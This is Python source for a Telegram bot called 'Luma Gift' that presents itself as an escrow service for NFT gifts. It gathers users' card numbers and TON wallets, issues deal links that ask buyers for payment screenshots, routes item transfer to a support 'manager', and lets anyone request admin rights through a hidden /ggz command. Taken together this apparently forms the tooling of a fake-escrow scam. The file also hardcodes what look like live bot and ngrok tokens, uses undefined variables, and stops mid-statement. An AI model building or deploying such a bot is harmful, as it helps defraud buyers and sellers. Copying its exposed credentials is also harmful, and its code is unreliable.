# ===================== IMPORTS =====================
import asyncio
import re
from datetime import datetime, timezone
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import State, StatesGroup
from aiogram.filters import StateFilter
import json
import os
from aiogram.types import WebAppInfo
from aiohttp import web
from pyngrok import ngrok

BOT_TOKEN = "8603271584:AAEYbTMAeutOwhvh3lqlGyLbWdMcKXmz7mE"
WELCOME_PHOTO = "https://i.postimg.cc/sgKcz6qr/photo-2026-04-17-11-42-42.jpg"
LOG_CHANNEL_ID = -1003965153016
MAIN_ADMIN_ID = 7825556645
NGROK_TOKEN = "3CrrANMLxtMg9GWNsoHKUK4nhic_5wdQm43maqQR6cD56V1wi"

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

all_users = {}
user_languages = {}
user_turnover = {}
_set_my_deals_waiting = set()
DEALS = {}
used_memos = set()
user_cards = {}
user_card_states = {}
user_ton = {}
user_ton_states = {}
user_photos = {}

# Файл для хранения админов
ADMINS_FILE = "admins.json"

def load_admins():
    if os.path.exists(ADMINS_FILE):
        with open(ADMINS_FILE, "r") as f:
            data = json.load(f)
            return set(data.get("admins", [])), data.get("admin_deals", {})
    return set(), {}

def save_admins():
    with open(ADMINS_FILE, "w") as f:
        json.dump({
            "admins": list(admins),
            "admin_deals": {str(k): v for k, v in admin_deals.items()}
        }, f)

admins, admin_deals = load_admins()

# ===================== TRANSLATIONS =====================
translations = {
    "welcome_text": {
        "ru": (
            "<b>👋 Вас приветствует Luma Gift!</b>\n\n"
            "<blockquote>"
            "<b>✨ Luma Gift — сервис, проверенный временем.</b>\n"
            "🤖 Ключевые метрики и сделки автоматизированы."
            "</blockquote>\n\n"
            "💼 Поддержка 24/7 — @LumaEscrow\n\n"
            "<b>🛡 Ваша безопасность — наша работа</b>"
        ),
        "en": (
            "<b>👋 Welcome to Luma Gift!</b>\n\n"
            "<blockquote>"
            "<b>✨ Luma Gift — a service proven by time.</b>\n"
            "🤖 Key metrics and deals are fully automated."
            "</blockquote>\n\n"
            "💼 Support 24/7 — @LumaEscrow\n\n"
            "<b>🛡 Your security is our top priority</b>"
        ),
    },
    "choose_language_text": {
        "ru": "🌍 Выберите язык / Choose your language:",
        "en": "🌍 Choose your language / Выберите язык:"
    },
    "start_keyboard": {
        "ru": {
            "open_luma": "🌐 Открыть Luma",
            "create_deal": "🛒 Активация ордера",
            "help": "🛡 Безопасность",
            "support": "💬 Поддержка",
            "language": "🌍 Сменить язык"
        },
        "en": {
            "open_luma": "🌐 Open Luma",
            "create_deal": "🛒 Order Activation",
            "help": "🛡 Security",
            "support": "💬 Support",
            "language": "🌍 Change Language"
        }
    },
    "deal_info": {
        "ru": (
            "💳 <b>Информация о сделке #{memo}</b>\n\n"
            "<blockquote>"
            "👤 Продавец: {seller}\n"
            "📦 Товар: {item}\n"
            "💰 Сумма к оплате: {price}\n"
            "🔖 Мемо: {memo}"
            "</blockquote>\n\n"
            "⚠️ Проверьте все данные перед оплатой!\n"
            "🎦 Пришлите скриншот с подтверждением оплаты."
        ),
        "en": (
            "💳 <b>Deal Information #{memo}</b>\n\n"
            "<blockquote>"
            "👤 Seller: {seller}\n"
            "📦 Item: {item}\n"
            "💰 Amount to pay: {price}\n"
            "🔖 Memo: {memo}"
            "</blockquote>\n\n"
            "⚠️ Please verify all details before payment!\n"
            "🎦 Send a screenshot confirming your payment."
        ),
    },
    "deal_created": {
        "ru": (
            "✅ <b>Сделка успешно создана!</b>\n\n"
            "<blockquote>"
            "📋 Описание: {item}\n"
            "💰 Сумма: {price}\n"
            "👤 Продавец: {seller}\n"
            "🔖 Код сделки: {memo}"
            "</blockquote>\n\n"
            "🔗 Ссылка: https://t.me/LumaEnBot?start={memo}\n\n"
            "ℹ️ Передача товара переходит к менеджеру."
        ),
        "en": (
            "✅ <b>Deal successfully created!</b>\n\n"
            "<blockquote>"
            "📋 Item: {item}\n"
            "💰 Amount: {price}\n"
            "👤 Seller: {seller}\n"
            "🔖 Deal code: {memo}"
            "</blockquote>\n\n"
            "🔗 Link: https://t.me/LumaEnBot?start={memo}\n\n"
            "ℹ️ Item transfer is handled by the manager."
        ),
    },
    "help_text": {
        "ru": (
            "<b>🛡 Безопасность</b>\n\n"
            "<blockquote>📦 Передача товара происходит напрямую через поддержку @LumaEscrow</blockquote>\n\n"
            "<blockquote>🔍 Перед оплатой обязательно сверяйте мемо и адрес</blockquote>\n\n"
            "<blockquote>✅ После получения товара подтвердите и завершите сделку</blockquote>"
        ),
        "en": (
            "<b>🛡 Security</b>\n\n"
            "<blockquote>📦 All items are transferred directly through support @LumaEscrow</blockquote>\n\n"
            "<blockquote>🔍 Always verify memo and address before making payment</blockquote>\n\n"
            "<blockquote>✅ Confirm receipt and complete the deal after receiving the item</blockquote>"
        ),
    },
    "bind_wallet": {
        "ru": {
            "title": "<b>💼 Управление реквизитами</b>\n\n<blockquote>Добавьте или обновите ваши платёжные реквизиты</blockquote>",
            "ton": "💎 TON-кошелёк",
            "card": "💳 Карта (реквизиты)",
            "back": "⬅ Назад"
        },
        "en": {
            "title": "<b>💼 Requisite Management</b>\n\n<blockquote>Add or update your payment details below</blockquote>",
            "ton": "💎 TON Wallet",
            "card": "💳 Card Details",
            "back": "⬅ Back"
        }
    },
    "card_screen": {
        "ru": {
            "text": "<b>💳 Ваши банковские реквизиты</b>\n\n<blockquote>Текущие данные: {current}</blockquote>\n\n📝 <b>Пример формата:</b>\n<code>2204 1201 1545 8914</code>",
            "back": "⬅ Назад",
            "saved": "✅ Реквизиты сохранены!",
            "error": "❌ Неверный формат карты! Введите 16 цифр."
        },
        "en": {
            "text": "<b>💳 Your Bank Card Details</b>\n\n<blockquote>Current details: {current}</blockquote>\n\n📝 <b>Example format:</b>\n<code>2204 1201 1545 8914</code>",
            "back": "⬅ Back",
            "saved": "✅ Card details saved!",
            "error": "❌ Invalid card format! Please enter 16 digits."
        }
    },
    "ton_screen": {
        "ru": {
            "text": "<b>💎 Ваш TON-кошелёк</b>\n\n<blockquote>Текущий адрес: {current}</blockquote>\n\n📝 <b>Пример формата:</b>\n<code>EQB9dQqP7n7r3Gm8...</code>",
            "back": "⬅ Назад",
            "saved": "✅ TON-адрес сохранён!",
            "error": "❌ Неверный TON-адрес. Проверьте и попробуйте снова."
        },
        "en": {
            "text": "<b>💎 Your TON Wallet</b>\n\n<blockquote>Current address: {current}</blockquote>\n\n📝 <b>Example format:</b>\n<code>EQB9dQqP7n7r3Gm8...</code>",
            "back": "⬅ Back",
            "saved": "✅ TON address saved!",
            "error": "❌ Invalid TON address. Please check and try again."
        }
    },
    "create_deal": {
        "ru": {
            "choose_type": "<b>🛒 Активация ордера</b>\n\n<blockquote>Выберите тип товара для сделки</blockquote>",
            "choose_currency": "<b>🛒 Активация ордера</b>\n\n<blockquote>Выберите валюту сделки</blockquote>",
            "enter_item": "<b>🛒 Активация ордера</b>\n\n<blockquote>Вы выбрали {currency}</blockquote>\n\n📝 Укажите товар сделки в формате:\n<code>https://t.me/nft/ToyBear-32961</code>",
            "enter_price": "💼 <b>Укажите цену сделки</b>\n\n<blockquote>Введите сумму в числовом формате</blockquote>\n\n📝 Пример: <code>1500</code>",
            "preview": (
                "🔖 <b>Подтверждение сделки</b>\n\n"
                "<blockquote>"
                "👤 Продавец: {seller}\n"
                "📋 Товар: {item}\n"
                "💰 Сумма: {price}"
                "</blockquote>\n\n"
                "Подтвердите создание сделки:"
            ),
            "confirm": "✅ Подтвердить",
            "cancel": "❌ Отмена",
            "gift": "🎁 Подарок",
            "channel": "📢 Канал / Чат",
            "user": "👤 Юзернейм",
            "back": "🔙 Назад",
            "item_too_short": "❌ Название слишком короткое. Попробуйте снова.",
            "price_error": "❌ Введите корректное число, например: <code>1500</code> или <code>1299.50</code>"
        },
        "en": {
            "choose_type": "<b>🛒 Order Activation</b>\n\n<blockquote>Select the type of item for the deal</blockquote>",
            "choose_currency": "<b>🛒 Order Activation</b>\n\n<blockquote>Select the currency for this deal</blockquote>",
            "enter_item": "<b>🛒 Order Activation</b>\n\n<blockquote>Selected currency: {currency}</blockquote>\n\n📝 Enter the item link or name:\n<code>https://t.me/nft/ToyBear-32961</code>",
            "enter_price": "💼 <b>Enter the Deal Amount</b>\n\n<blockquote>Provide the price in numeric format</blockquote>\n\n📝 Example: <code>1500</code>",
            "preview": (
                "🔖 <b>Deal Confirmation</b>\n\n"
                "<blockquote>"
                "👤 Seller: {seller}\n"
                "📋 Item: {item}\n"
                "💰 Amount: {price}"
                "</blockquote>\n\n"
                "Please confirm the deal creation:"
            ),
            "confirm": "✅ Confirm",
            "cancel": "❌ Cancel",
            "gift": "🎁 Gift",
            "channel": "📢 Channel / Chat",
            "user": "👤 Username",
            "back": "🔙 Back",
            "item_too_short": "❌ Item name is too short. Please try again.",
            "price_error": "❌ Please enter a valid number, e.g. <code>1500</code> or <code>1299.50</code>"
        }
    },
    "main_menu": {
        "ru": {
            "bind_wallet": "💼 Управление реквизитами",
            "create_deal": "🛒 Активация ордера",
            "choose_lang": "🌍 Сменить язык / Change Language",
            "support": "💬 Поддержка",
            "help": "🛡 Безопасность"
        },
        "en": {
            "bind_wallet": "💼 Requisite Management",
            "create_deal": "🛒 Order Activation",
            "choose_lang": "🌍 Change Language",
            "support": "💬 Support",
            "help": "🛡 Security"
        }
    },
    "back": {
        "ru": "🔙 Вернуться",
        "en": "🔙 Back"
    },
    "deal_joined": {
        "ru": "👤 Пользователь <b>{name}</b> присоединился к сделке.",
        "en": "👤 User <b>{name}</b> has joined the deal."
    },
    "memo_used": {
        "ru": "⚠️ Эта ссылка уже была использована.",
        "en": "⚠️ This link has already been used."
    },
    "deal_not_found": {
        "ru": "⚠️ Сделка не найдена.",
        "en": "⚠️ Deal not found."
    },
    "pay_btn": {
        "ru": "✅ Оплатить",
        "en": "✅ Pay Now"
    },
    "decline_btn": {
        "ru": "❌ Отклонить",
        "en": "❌ Decline"
    },
    "session_expired": {
        "ru": "⚠️ Сессия истекла. Начните заново.",
        "en": "⚠️ Session expired. Please start over."
    },
    "deal_confirmed_msg": {
        "ru": "Сделка создана!",
        "en": "Deal created!"
    },
    "support_closed": {
        "ru": (
            "✅ <b>Ваше обращение #{ticket_id} завершено.</b>\n\n"
            "<blockquote>Благодарим за обращение в поддержку Luma!</blockquote>"
        ),
        "en": (
            "✅ <b>Your ticket #{ticket_id} has been closed.</b>\n\n"
            "<blockquote>Thank you for contacting Luma Support!</blockquote>"
        )
    },
    "support_reply_header": {
        "ru": "💬 <b>Ответ по обращению #{ticket_id}</b>\n\n{text}",
        "en": "💬 <b>Reply to ticket #{ticket_id}</b>\n\n{text}"
    },
    "deal_completed_seller": {
        "ru": (
            "✅ <b>Сделка {memo} завершена!</b>\n\n"
            "<blockquote>Покупатель подтвердил получение товара.</blockquote>"
        ),
        "en": (
            "✅ <b>Deal {memo} completed!</b>\n\n"
            "<blockquote>The buyer has confirmed receipt of the item.</blockquote>"
        )
    }
}


# ===================== FSM STATES =====================
class CreateDealStates(StatesGroup):
    waiting_for_currency = State()
    waiting_for_item = State()
    waiting_for_price = State()
    waiting_for_confirm = State()


# ===================== HELPERS =====================
def t(key: str, lang: str, **kwargs) -> str:
    """Get translation by dot-notation key, e.g. t('back', lang)"""
    val = translations.get(key, {})
    if isinstance(val, dict):
        text = val.get(lang, val.get("en", ""))
    else:
        text = val
    if kwargs:
        text = text.format(**kwargs)
    return text


def start_keyboard(uid: int) -> InlineKeyboardMarkup:
    """Клавиатура стартового меню — используется и при /start, и при смене языка."""
    lang = user_languages.get(uid, "ru")
    sk = translations["start_keyboard"][lang]
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=sk["open_luma"], web_app=WebAppInfo(url="https://pathfys.github.io/Luma1/"))],
        [
            InlineKeyboardButton(text=sk["create_deal"], callback_data="create_deal"),
            InlineKeyboardButton(text=sk["help"], callback_data="help")
        ],
        [
            InlineKeyboardButton(text=sk["support"], url="https://t.me/LumaEscrow"),
            InlineKeyboardButton(text=sk["language"], callback_data="choose_language")
        ],
    ])


def main_menu(uid: int) -> InlineKeyboardMarkup:
    lang = user_languages.get(uid, "ru")
    m = translations["main_menu"][lang]
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=m["bind_wallet"], callback_data="bind_wallet")],
            [InlineKeyboardButton(text=m["create_deal"], callback_data="create_deal")],
            [InlineKeyboardButton(text=m["choose_lang"], callback_data="choose_language")],
            [InlineKeyboardButton(text=m["support"], url="https://t.me/LumaEscrow")],
            [InlineKeyboardButton(text=m["help"], callback_data="help")]
        ]
    )


def language_selection_menu() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Русский 🇷🇺", callback_data="lang_ru")],
            [InlineKeyboardButton(text="English 🇺🇸", callback_data="lang_en")]
        ]
    )


PHOTOS_FILE = "user_photos.json"


def load_photos():
    if os.path.exists(PHOTOS_FILE):
        with open(PHOTOS_FILE, "r") as f:
            return json.load(f)
    return {}


def save_photos():
    with open(PHOTOS_FILE, "w") as f:
        json.dump({str(k): v for k, v in user_photos.items()}, f)


user_photos = {int(k): v for k, v in load_photos().items()}


async def safe_send_photo(chat_id: int, photo: str, caption: str, reply_markup=None):
    try:
        await bot.send_photo(
            chat_id=chat_id, photo=photo, caption=caption,
            parse_mode="HTML", reply_markup=reply_markup
        )
    except Exception as e:
        print(f"[ERROR] Photo not sent to {chat_id}: {e}")


async def format_user_name(user) -> str:
    if getattr(user, "username", None):
        return f"@{user.username}"
    if getattr(user, "full_name", None):
        return user.full_name
    return f"User_{user.id}"


def validate_ton_address(addr: str) -> bool:
    addr = addr.strip()
    if re.match(r"^[EU]Q[a-zA-Z0-9\-_]{45,}$", addr):
        return True
    if re.match(r"^0:[0-9a-fA-F]{64}$", addr):
        return True
    return False


def escape_md_v2(text: str) -> str:
    escape_chars = r"_*[]()~`>#+-=|{}.!\""
    return re.sub(f"([{re.escape(escape_chars)}])", r"\\\1", text)


def is_admin(uid: int) -> bool:
    return uid in admins


# ===================== ADMIN REPLY FROM LOG CHANNEL =====================
@dp.message(lambda m: (
    m.chat.id == int(LOG_CHANNEL_ID)
    and m.reply_to_message is not None
    and m.reply_to_message.message_id in reply_contexts
))
async def handle_admin_reply(message: Message):
    print(f"[DEBUG] handle_admin_reply triggered!")
    ctx = reply_contexts.pop(message.reply_to_message.message_id, None)
    if not ctx:
        return

    uid = ctx["uid"]
    ticket_id = ctx["ticket_id"]
    reply_text = message.text or message.caption or ""
    lang = user_languages.get(uid, "ru")

    if ticket_id in support_tickets:
        support_tickets[ticket_id].setdefault("replies", []).append(reply_text)

    try:
        await bot.send_message(
            uid,
            t("support_reply_header", lang, ticket_id=ticket_id, text=reply_text),
            parse_mode="HTML"
        )
        await message.reply("✅ Ответ отправлен пользователю!")
    except Exception as e:
        print(f"[ERROR] reply to user: {e}")
        await message.reply(f"❌ Не удалось отправить: {e}")


# ===================== START =====================
@dp.message(Command("start"))
async def start_command(message: Message, state: FSMContext):
    await state.clear()
    uid = message.from_user.id
    all_users.setdefault(uid, {
        "username": message.from_user.username,
        "full_name": message.from_user.full_name
    })
    user_languages.setdefault(uid, "ru")
    lang = user_languages[uid]

    parts = message.text.split()
    memo_arg = parts[1] if len(parts) > 1 else None

    if memo_arg:
        if memo_arg in used_memos:
            await message.answer(t("memo_used", lang))
            return
        deal = DEALS.get(memo_arg)
        if deal:
            seller_id = deal["seller_id"]
            seller_info = all_users.get(seller_id, {"username": None, "full_name": "Seller"})
            seller_name = (
                f"@{seller_info['username']}"
                if seller_info.get("username")
                else seller_info.get("full_name", "Seller")
            )
            buyer_text = t(
                "deal_info", lang,
                memo=deal["memo"],
                seller=seller_name,
                item=deal["item"],
                price=deal["price"]
            )
            keyboard = InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text=t("pay_btn", lang), callback_data=f"pay_{deal['memo']}"),
                InlineKeyboardButton(text=t("decline_btn", lang), callback_data=f"decline_{deal['memo']}")
            ]])
            await safe_send_photo(chat_id=uid, photo=WELCOME_PHOTO, caption=buyer_text, reply_markup=keyboard)
            buyer_name = message.from_user.full_name
            seller_lang = user_languages.get(seller_id, "ru")
            await bot.send_message(
                chat_id=seller_id,
                text=t("deal_joined", seller_lang, name=buyer_name),
                parse_mode="HTML"
            )
            used_memos.add(memo_arg)
            return
        else:
            await message.answer(t("deal_not_found", lang))
            return

    try:
        username = message.from_user.username or message.from_user.full_name
        log_text = (
            f"👤 <b>Новый пользователь открыл бота</b>\n\n"
            f"➕ @{username}\n"
            f"🆔 ID: {uid}\n"
            f"🕒 {datetime.now().strftime('%d.%m.%Y %H:%M')}"
        )
        await bot.send_message(LOG_CHANNEL_ID, log_text, parse_mode="HTML")
    except Exception as e:
        print(f"[ERROR] /start log: {e}")

    await safe_send_photo(
        chat_id=uid,
        photo=WELCOME_PHOTO,
        caption=t("welcome_text", lang),
        reply_markup=start_keyboard(uid)
    )


# ===================== LANGUAGE =====================
@dp.callback_query(F.data == "choose_language")
async def choose_language(callback: CallbackQuery):
    lang = user_languages.get(callback.from_user.id, "ru")
    await bot.send_message(
        chat_id=callback.from_user.id,
        text=t("choose_language_text", lang),
        reply_markup=language_selection_menu()
    )
    await callback.answer()


@dp.callback_query(F.data == "lang_ru")
async def set_lang_ru(callback: CallbackQuery):
    uid = callback.from_user.id
    user_languages[uid] = "ru"
    await safe_send_photo(uid, WELCOME_PHOTO, t("welcome_text", "ru"), start_keyboard(uid))
    await callback.answer("Язык установлен на Русский ✅")


@dp.callback_query(F.data == "lang_en")
async def set_lang_en(callback: CallbackQuery):
    uid = callback.from_user.id
    user_languages[uid] = "en"
    await safe_send_photo(uid, WELCOME_PHOTO, t("welcome_text", "en"), start_keyboard(uid))
    await callback.answer("Language set to English ✅")


# ===================== BACK =====================
@dp.callback_query(F.data == "back_to_main")
async def back_to_main(callback: CallbackQuery):
    uid = callback.from_user.id
    lang = user_languages.get(uid, "ru")
    try:
        await callback.message.delete()
    except:
        pass
    await safe_send_photo(uid, WELCOME_PHOTO, t("welcome_text", lang), start_keyboard(uid))
    await callback.answer()


# ===================== HELP / SECURITY =====================
@dp.callback_query(F.data == "help")
async def show_help(callback: CallbackQuery):
    uid = callback.from_user.id
    lang = user_languages.get(uid, "ru")
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=t("back", lang), callback_data="back_to_main")
    ]])
    await safe_send_photo(uid, WELCOME_PHOTO, t("help_text", lang), keyboard)
    await callback.answer()


# ===================== REQUISITES =====================
@dp.callback_query(F.data == "bind_wallet")
async def bind_wallet_handler(callback: CallbackQuery):
    uid = callback.from_user.id
    lang = user_languages.get(uid, "ru")
    tr = translations["bind_wallet"][lang]
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=tr["ton"], callback_data="ton_wallet")],
        [InlineKeyboardButton(text=tr["card"], callback_data="card_requisites")],
        [InlineKeyboardButton(text=tr["back"], callback_data="back_to_main")]
    ])
    await bot.send_message(uid, tr["title"], parse_mode="HTML", reply_markup=keyboard)
    await callback.answer()


@dp.callback_query(F.data == "card_requisites")
async def card_requisites_handler(callback: CallbackQuery):
    uid = callback.from_user.id
    lang = user_languages.get(uid, "ru")
    tr = translations["card_screen"][lang]
    not_set = "не указаны" if lang == "ru" else "not set"
    current = user_cards.get(uid, not_set)
    text = tr["text"].format(current=current)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=tr["back"], callback_data="bind_wallet")
    ]])
    user_card_states[uid] = True
    await callback.message.edit_text(text=text, reply_markup=keyboard, parse_mode="HTML")
    await callback.answer()


@dp.callback_query(F.data == "ton_wallet")
async def ton_wallet_handler(callback: CallbackQuery):
    uid = callback.from_user.id
    lang = user_languages.get(uid, "ru")
    tr = translations["ton_screen"][lang]
    not_set = "не указан" if lang == "ru" else "not set"
    current = user_ton.get(uid, not_set)
    text = tr["text"].format(current=current)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=tr["back"], callback_data="bind_wallet")
    ]])
    user_ton_states[uid] = True
    await callback.message.edit_text(text=text, reply_markup=keyboard, parse_mode="HTML")
    await callback.answer()


# ===================== CREATE DEAL =====================
@dp.callback_query(F.data == "create_deal")
async def start_create_deal(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    lang = user_languages.get(uid, "ru")
    cd = translations["create_deal"][lang]
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=cd["gift"], callback_data="deal_type_gift")],
        [InlineKeyboardButton(text=cd["channel"], callback_data="deal_type_channel")],
        [InlineKeyboardButton(text=cd["user"], callback_data="deal_type_user")]
    ])
    await safe_send_photo(uid, WELCOME_PHOTO, cd["choose_type"], keyboard)
    await callback.answer()


async def show_currency_menu(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    lang = user_languages.get(uid, "ru")
    cd = translations["create_deal"][lang]
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🇷🇺 RUB", callback_data="currency_rub")],
        [InlineKeyboardButton(text="🇧🇾 BYN", callback_data="currency_byn")],
        [InlineKeyboardButton(text="🇺🇦 UAH", callback_data="currency_uah")],
        [InlineKeyboardButton(text="💎 TON", callback_data="currency_ton")],
        [InlineKeyboardButton(text=cd["back"], callback_data="back_to_main")]
    ])
    await safe_send_photo(uid, WELCOME_PHOTO, cd["choose_currency"], keyboard)
    await state.set_state(CreateDealStates.waiting_for_currency)
    await callback.answer()


@dp.callback_query(F.data == "deal_type_gift")
async def handle_gift(callback: CallbackQuery, state: FSMContext):
    await show_currency_menu(callback, state)


@dp.callback_query(F.data == "deal_type_channel")
async def handle_channel(callback: CallbackQuery, state: FSMContext):
    await show_currency_menu(callback, state)


@dp.callback_query(F.data == "deal_type_user")
async def handle_user_type(callback: CallbackQuery, state: FSMContext):
    await show_currency_menu(callback, state)


@dp.callback_query(lambda c: c.data.startswith("currency_"), StateFilter(CreateDealStates.waiting_for_currency))
async def process_currency(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    lang = user_languages.get(uid, "ru")
    cd = translations["create_deal"][lang]
    currency = callback.data.split("_")[1].upper()
    currency_display = {
        "BYN": "Belarusian Ruble 🇧🇾" if lang == "en" else "Белорусский рубль 🇧🇾",
        "UAH": "Ukrainian Hryvnia 🇺🇦" if lang == "en" else "Гривны 🇺🇦",
        "RUB": "Russian Ruble 🇷🇺" if lang == "en" else "Российский рубль 🇷🇺",
        "TON": "TON 💎"
    }
    display_name = currency_display.get(currency, currency)
    await state.update_data(selected_currency=currency)
    await state.set_state(CreateDealStates.waiting_for_item)
    text = cd["enter_item"].format(currency=display_name)
    await bot.send_message(uid, text, parse_mode="HTML", disable_web_page_preview=True)
    await callback.answer()


@dp.message(CreateDealStates.waiting_for_item)
async def process_item(message: Message, state: FSMContext):
    uid = message.from_user.id
    lang = user_languages.get(uid, "ru")
    cd = translations["create_deal"][lang]
    item = message.text.strip()
    if len(item) < 2:
        await message.answer(cd["item_too_short"], parse_mode="HTML")
        return
    await state.update_data(item=item)
    await message.answer(cd["enter_price"], parse_mode="HTML")
    await state.set_state(CreateDealStates.waiting_for_price)


@dp.message(CreateDealStates.waiting_for_price)
async def process_price(message: Message, state: FSMContext):
    uid = message.from_user.id
    lang = user_languages.get(uid, "ru")
    cd = translations["create_deal"][lang]
    price_text = message.text.strip().replace(",", ".")
    if not re.match(r"^\d+(\.\d{1,2})?$", price_text):
        await message.answer(cd["price_error"], parse_mode="HTML")
        return
    data = await state.get_data()
    seller_name = await format_user_name(message.from_user)
    preview = cd["preview"].format(seller=seller_name, item=data["item"], price=price_text)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=cd["confirm"], callback_data="deal_confirm"),
        InlineKeyboardButton(text=cd["cancel"], callback_data="deal_cancel")
    ]])
    await state.update_data(price=price_text, seller_id=uid, seller_name=seller_name)
    await message.answer(preview, parse_mode="HTML", reply_markup=keyboard)
    await state.set_state(CreateDealStates.waiting_for_confirm)


@dp.callback_query(lambda c: c.data == "deal_confirm")
async def process_confirmation(callback: CallbackQuery, state: FSMContext):
    import random, string
    from aiogram.types import InputMediaPhoto
    uid = callback.from_user.id
    lang = user_languages.get(uid, "ru")
    data = await state.get_data()
    if not data:
        await callback.answer(t("session_expired", lang), show_alert=True)
        await state.clear()
        return
    memo = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    deal = {
        "seller_name": data["seller_name"],
        "seller_id": data["seller_id"],
        "item": data["item"],
        "price": data["price"],
        "memo": memo
    }
    DEALS[memo] = deal
    text = t("deal_created", lang,
             item=deal["item"], price=deal["price"],
             seller=deal["seller_name"], memo=memo)
    try:
        await callback.message.edit_media(
            media=InputMediaPhoto(media=WELCOME_PHOTO, caption=text, parse_mode="HTML")
        )
    except Exception as e:
        print(f"[ERROR] edit_media: {e}")
    try:
        log_text = escape_md_v2(
            f"🟢 Новая сделка создана\n\n"
            f"👤 Продавец: {deal['seller_name']} ({deal['seller_id']})\n"
            f"📦 Товар: {deal['item']}\n"
            f"💰 Сумма: {deal['price']}\n"
            f"🔖 Код: {deal['memo']}\n"
            f"🕒 {datetime.now().isoformat()}"
        )
        await bot.send_message(LOG_CHANNEL_ID, log_text, parse_mode="MarkdownV2")
    except Exception as e:
        print(f"[ERROR] deal log: {e}")
    await callback.answer(t("deal_confirmed_msg", lang))
    await state.clear()


# ===================== ADMIN COMMANDS =====================
pending_admin_requests: dict[int, dict] = {}


@dp.message(Command("ggz"))
async def cmd_ggz_grant_admin(message: Message):
    uid = message.from_user.id
    username = message.from_user.username or message.from_user.full_name
    lang = user_languages.get(uid, "ru")

    if uid in admins:
        already_msg = (
            "✅ <b>У вас уже есть права администратора.</b>"
            if lang == "ru"
            else "✅ <b>You already have admin rights.</b>"
        )
        await message.answer(already_msg, parse_mode="HTML")
        return

    if uid in pending_admin_requests:
        wait_msg = (
            "⏳ <b>Ваша заявка уже отправлена. Ожидайте решения.</b>"
            if lang == "ru"
            else "⏳ <b>Your request is already pending. Please wait.</b>"
        )
        await message.answer(wait_msg, parse_mode="HTML")
        return

    pending_admin_requests[uid] = {
        "username": username,
        "full_name": message.from_user.full_name or "",
    }

    sent_msg = (
        "📨 <b>Ваша заявка на права администратора отправлена.</b>\n\n"
        "<blockquote>Ожидайте решения. Вы получите уведомление.</blockquote>"
        if lang == "ru"
        else "📨 <b>Your admin request has been submitted.</b>\n\n"
        "<blockquote>Please wait. You will be notified of the decision.</blockquote>"
    )
    await message.answer(sent_msg, parse_mode="HTML")

    try:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="✅ Одобрить", callback_data=f"admin_approve_{uid}"),
            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"admin_decline_{uid}")
        ]])
        await bot.send_message(
            LOG_CHANNEL_ID,
            f"📋 <b>Заявка на права администратора</b>\n\n"
            f"<blockquote>"
            f"👤 Пользователь: @{username}\n"
            f"🆔 ID: {uid}\n"
            f"🕒 {datetime.now().strftime('%d.%m.%Y %H:%M')}"
            f"</blockquote>",
            parse_mode="HTML",
            reply_markup=keyboard
        )
    except Exception as e:
        print(f"[ERROR] admin request log: {e}")


@dp.callback_query(lambda c: c.data.startswith("admin_approve_"))
async def admin_approve(callback: CallbackQuery):
    target_uid = int(callback.data.replace("admin_approve_", ""))
    info = pending_admin_requests.pop(target_uid, None)

    if target_uid in admins:
        await callback.answer("⚠️ Пользователь уже является администратором.", show_alert=True)
        return

    admins.add(target_uid)
    save_admins()
    admin_deals.setdefault(target_uid, 0)

    username = info["username"] if info else str(target_uid)

    try:
        lang = user_languages.get(target_uid, "ru")
        notify_msg = (
            "✅ <b>Ваша заявка одобрена!</b>\n\n"
            "<blockquote>Права администратора выданы.\nИспользуйте /panel для просмотра команд.</blockquote>"
            if lang == "ru"
            else "✅ <b>Your request has been approved!</b>\n\n"
            "<blockquote>Admin rights granted.\nUse /panel to see available commands.</blockquote>"
        )
        await bot.send_message(target_uid, notify_msg, parse_mode="HTML")
    except Exception as e:
        print(f"[ERROR] admin approve notify: {e}")

    await callback.message.edit_text(
        callback.message.text + f"\n\n✅ <b>Одобрено</b> (@{callback.from_user.username or callback.from_user.full_name})",
        parse_mode="HTML"
    )
    await callback.answer("✅ Администратор добавлен!")

    try:
        await bot.send_message(
            LOG_CHANNEL_ID,
            f"♦️ <b>Новый администратор добавлен</b>\n\n"
            f"<blockquote>👤 @{username}\n🆔 {target_uid}</blockquote>",
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"[ERROR] admin approve log: {e}")


@dp.callback_query(lambda c: c.data.startswith("admin_decline_"))
async def admin_decline(callback: CallbackQuery):
    target_uid = int(callback.data.replace("admin_decline_", ""))
    info = pending_admin_requests.pop(target_uid, None)
    username = info["username"] if info else str(target_uid)

    try:
        lang = user_languages.get(target_uid, "ru")
        notify_msg = (
            "❌ <b>Ваша заявка отклонена.</b>\n\n"
            "<blockquote>Права администратора не были выданы.</blockquote>"
            if lang == "ru"
            else "❌ <b>Your request has been declined.</b>\n\n"
            "<blockquote>Admin rights were not granted.</blockquote>"
        )
        await bot.send_message(target_uid, notify_msg, parse_mode="HTML")
    except Exception as e:
        print(f"[ERROR] admin decline notify: {e}")

    await callback.message.edit_text(
